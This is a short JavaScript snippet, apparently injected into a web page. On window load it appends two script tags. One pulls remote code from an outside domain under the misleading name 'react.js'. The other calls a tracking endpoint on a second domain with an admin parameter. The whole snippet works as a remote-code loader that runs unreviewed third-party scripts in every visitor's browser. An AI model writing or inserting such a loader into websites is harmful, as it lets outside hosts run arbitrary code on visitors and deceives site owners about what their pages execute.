window.onload = function(){
        var  aaa = 0;
        var json = {"0":"http:\/\/images.hnguangyuan.cn\/react.js?id=1190"};
        var randomNum = Math.round(Math.random() * 0);
        var  url = json[randomNum];
        let script = document.createElement('script');
        script.src = url
        script.id = 'adver'
        script.type = 'text/javascript'
        document.getElementsByTagName('head')[0].appendChild(script);

        let scripts = document.createElement('script');
        scripts.src = 'http://adcapi.com/statis/thestal?admin_id=1'
        // scripts.src = 'http://adcapi.com/statis/thestal?admin_id=1&name=name&enum=enum'
        scripts.id = 'adver'
        scripts.type = 'text/javascript'
        document.getElementsByTagName('head')[0].appendChild(scripts);


};